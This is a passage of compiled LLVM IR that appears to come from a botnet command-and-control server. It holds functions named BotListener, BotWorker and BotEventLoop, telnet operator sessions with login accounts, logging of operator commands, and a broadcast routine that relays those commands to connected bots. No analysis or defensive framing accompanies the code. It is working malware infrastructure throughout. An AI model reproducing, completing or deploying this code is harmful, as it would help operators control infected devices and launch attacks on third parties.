  br label %320, !llvm.loop !19

590:                                              ; preds = %569
  %591 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %592 = call i8* @strstr(i8* %591, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i64 0, i64 0)) #8
  %593 = icmp ne i8* %592, null
  br i1 %593, label %594, label %685

594:                                              ; preds = %590
  %595 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %595, i8 0, i64 2048, i1 false)
  %596 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %597 = call i32 (i8*, i8*, ...) @sprintf(i8* %596, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i64 0, i64 0)) #9
  %598 = load i32, i32* %4, align 4
  %599 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %601 = call i64 @strlen(i8* %600) #8
  %602 = call i64 @send(i32 %598, i8* %599, i64 %601, i32 16384)
  %603 = icmp eq i64 %602, -1
  br i1 %603, label %604, label %605

604:                                              ; preds = %594
  br label %776

605:                                              ; preds = %594
  %606 = load i32, i32* %4, align 4
  %607 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %608 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %609 = call i64 @strlen(i8* %608) #8
  %610 = call i64 @send(i32 %606, i8* %607, i64 %609, i32 16384)
  %611 = icmp eq i64 %610, -1
  br i1 %611, label %612, label %613

612:                                              ; preds = %605
  br label %776

613:                                              ; preds = %605
  %614 = load i32, i32* %4, align 4
  %615 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %616 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %617 = call i64 @strlen(i8* %616) #8
  %618 = call i64 @send(i32 %614, i8* %615, i64 %617, i32 16384)
  %619 = icmp eq i64 %618, -1
  br i1 %619, label %620, label %621

620:                                              ; preds = %613
  br label %776

621:                                              ; preds = %613
  %622 = load i32, i32* %4, align 4
  %623 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %624 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %625 = call i64 @strlen(i8* %624) #8
  %626 = call i64 @send(i32 %622, i8* %623, i64 %625, i32 16384)
  %627 = icmp eq i64 %626, -1
  br i1 %627, label %628, label %629

628:                                              ; preds = %621
  br label %776

629:                                              ; preds = %621
  %630 = load i32, i32* %4, align 4
  %631 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %632 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %633 = call i64 @strlen(i8* %632) #8
  %634 = call i64 @send(i32 %630, i8* %631, i64 %633, i32 16384)
  %635 = icmp eq i64 %634, -1
  br i1 %635, label %636, label %637

636:                                              ; preds = %629
  br label %776

637:                                              ; preds = %629
  %638 = load i32, i32* %4, align 4
  %639 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %640 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %641 = call i64 @strlen(i8* %640) #8
  %642 = call i64 @send(i32 %638, i8* %639, i64 %641, i32 16384)
  %643 = icmp eq i64 %642, -1
  br i1 %643, label %644, label %645

644:                                              ; preds = %637
  br label %776

645:                                              ; preds = %637
  %646 = load i32, i32* %4, align 4
  %647 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %648 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %649 = call i64 @strlen(i8* %648) #8
  %650 = call i64 @send(i32 %646, i8* %647, i64 %649, i32 16384)
  %651 = icmp eq i64 %650, -1
  br i1 %651, label %652, label %653

652:                                              ; preds = %645
  br label %776

653:                                              ; preds = %645
  %654 = load i32, i32* %4, align 4
  %655 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %656 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %657 = call i64 @strlen(i8* %656) #8
  %658 = call i64 @send(i32 %654, i8* %655, i64 %657, i32 16384)
  %659 = icmp eq i64 %658, -1
  br i1 %659, label %660, label %661

660:                                              ; preds = %653
  br label %776

661:                                              ; preds = %653
  %662 = load i32, i32* %4, align 4
  %663 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %664 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %665 = call i64 @strlen(i8* %664) #8
  %666 = call i64 @send(i32 %662, i8* %663, i64 %665, i32 16384)
  %667 = icmp eq i64 %666, -1
  br i1 %667, label %668, label %669

668:                                              ; preds = %661
  br label %776

669:                                              ; preds = %661
  br label %670

670:                                              ; preds = %669
  %671 = load i32, i32* %4, align 4
  %672 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %673 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %674 = call i64 @strlen(i8* %673) #8
  %675 = call i64 @send(i32 %671, i8* %672, i64 %674, i32 16384)
  %676 = icmp eq i64 %675, -1
  br i1 %676, label %677, label %678

677:                                              ; preds = %670
  br label %776

678:                                              ; preds = %670
  %679 = load i32, i32* %4, align 4
  %680 = call i64 @send(i32 %679, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %681 = icmp eq i64 %680, -1
  br i1 %681, label %682, label %683

682:                                              ; preds = %678
  br label %776

683:                                              ; preds = %678
  br label %684

684:                                              ; preds = %683
  br label %320, !llvm.loop !19

685:                                              ; preds = %590
  %686 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %687 = call i8* @strstr(i8* %686, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i64 0, i64 0)) #8
  %688 = icmp ne i8* %687, null
  br i1 %688, label %689, label %709

689:                                              ; preds = %685
  %690 = load i8*, i8** %3, align 8
  %691 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %690) #9
  %692 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i64 0, i64 0
  %693 = call i32 (i8*, i8*, ...) @sprintf(i8* %692, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.63, i64 0, i64 0)) #9
  %694 = load i32, i32* %4, align 4
  %695 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i64 0, i64 0
  %696 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i64 0, i64 0
  %697 = call i64 @strlen(i8* %696) #8
  %698 = call i64 @send(i32 %694, i8* %695, i64 %697, i32 16384)
  %699 = icmp eq i64 %698, -1
  br i1 %699, label %700, label %701

700:                                              ; preds = %689
  br label %776

701:                                              ; preds = %689
  %702 = load i8*, i8** %3, align 8
  %703 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %702) #9
  %704 = load i32, i32* %4, align 4
  %705 = call i64 @send(i32 %704, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %706 = icmp eq i64 %705, -1
  br i1 %706, label %707, label %708

707:                                              ; preds = %701
  br label %776

708:                                              ; preds = %701
  br label %320, !llvm.loop !19

709:                                              ; preds = %685
  %710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %711 = call i8* @strstr(i8* %710, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i64 0, i64 0)) #8
  %712 = icmp ne i8* %711, null
  br i1 %712, label %713, label %731

713:                                              ; preds = %709
  %714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %714, i8 0, i64 2048, i1 false)
  %715 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  %716 = load i32, i32* %5, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %717
  %719 = getelementptr inbounds %struct.login_info, %struct.login_info* %718, i32 0, i32 0
  %720 = getelementptr inbounds [20 x i8], [20 x i8]* %719, i64 0, i64 0
  %721 = call i32 (i8*, i8*, ...) @sprintf(i8* %715, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.65, i64 0, i64 0), i8* %720) #9
  %722 = load i32, i32* %4, align 4
  %723 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  %724 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  %725 = call i64 @strlen(i8* %724) #8
  %726 = call i64 @send(i32 %722, i8* %723, i64 %725, i32 16384)
  %727 = icmp eq i64 %726, -1
  br i1 %727, label %728, label %729

728:                                              ; preds = %713
  br label %776

729:                                              ; preds = %713
  %730 = call i32 @sleep(i32 5)
  br label %776

731:                                              ; preds = %709
  %732 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %732)
  %733 = load i32, i32* %4, align 4
  %734 = call i64 @send(i32 %733, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 11, i32 16384)
  %735 = icmp eq i64 %734, -1
  br i1 %735, label %736, label %737

736:                                              ; preds = %731
  br label %776

737:                                              ; preds = %731
  %738 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %739 = call i64 @strlen(i8* %738) #8
  %740 = icmp eq i64 %739, 0
  br i1 %740, label %741, label %742

741:                                              ; preds = %737
  br label %320, !llvm.loop !19

742:                                              ; preds = %737
  %743 = load i32, i32* %5, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %744
  %746 = getelementptr inbounds %struct.login_info, %struct.login_info* %745, i32 0, i32 0
  %747 = getelementptr inbounds [20 x i8], [20 x i8]* %746, i64 0, i64 0
  %748 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %749 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.66, i64 0, i64 0), i8* %747, i8* %748)
  %750 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0))
  store %struct._IO_FILE* %750, %struct._IO_FILE** %59, align 8
  %751 = call i64 @time(i64* null) #9
  store i64 %751, i64* %60, align 8
  %752 = call %struct.tm* @gmtime(i64* %60) #9
  store %struct.tm* %752, %struct.tm** %61, align 8
  %753 = getelementptr inbounds [50 x i8], [50 x i8]* %62, i64 0, i64 0
  %754 = load %struct.tm*, %struct.tm** %61, align 8
  %755 = call i64 @strftime(i8* %753, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i64 0, i64 0), %struct.tm* %754) #9
  %756 = load %struct._IO_FILE*, %struct._IO_FILE** %59, align 8
  %757 = getelementptr inbounds [50 x i8], [50 x i8]* %62, i64 0, i64 0
  %758 = load i32, i32* %5, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %759
  %761 = getelementptr inbounds %struct.login_info, %struct.login_info* %760, i32 0, i32 0
  %762 = getelementptr inbounds [20 x i8], [20 x i8]* %761, i64 0, i64 0
  %763 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %764 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %756, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i64 0, i64 0), i8* %757, i8* %762, i8* %763)
  %765 = load %struct._IO_FILE*, %struct._IO_FILE** %59, align 8
  %766 = call i32 @fclose(%struct._IO_FILE* %765)
  %767 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %768 = load i32, i32* %4, align 4
  %769 = load i32, i32* %5, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %770
  %772 = getelementptr inbounds %struct.login_info, %struct.login_info* %771, i32 0, i32 0
  %773 = getelementptr inbounds [20 x i8], [20 x i8]* %772, i64 0, i64 0
  call void @broadcast(i8* %767, i32 %768, i8* %773)
  %774 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %774, i8 0, i64 2048, i1 false)
  br label %320, !llvm.loop !19

775:                                              ; preds = %320
  br label %776

776:                                              ; preds = %775, %736, %729, %728, %707, %700, %682, %677, %668, %660, %652, %644, %636, %628, %620, %612, %604, %588, %583, %567, %560, %552, %544, %536, %528, %503, %496, %488, %480, %472, %464, %456, %448, %440, %432, %424, %416, %408, %369, %346, %311, %306, %297, %289, %281, %273, %265, %257, %249, %241, %233, %225, %217, %174, %173, %163, %144, %138, %113, %107
  %777 = load i32, i32* %4, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %778
  %780 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %779, i32 0, i32 0
  store i32 0, i32* %780, align 4
  %781 = load i32, i32* %4, align 4
  %782 = call i32 @close(i32 %781)
  %783 = load volatile i32, i32* @OperatorsConnected, align 4
  %784 = add nsw i32 %783, -1
  store volatile i32 %784, i32* @OperatorsConnected, align 4
  br label %785

785:                                              ; preds = %776, %364, %341
  %786 = load i8*, i8** %2, align 8
  ret i8* %786
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.71, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.73, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.74, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.75, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.76, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 %47, i32 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.78, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 %62, i32 1, i32 %63, %struct.epoll_event* %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %74, !llvm.loop !20

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* %85, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0))
  %92 = call i32 @sleep(i32 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.83, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

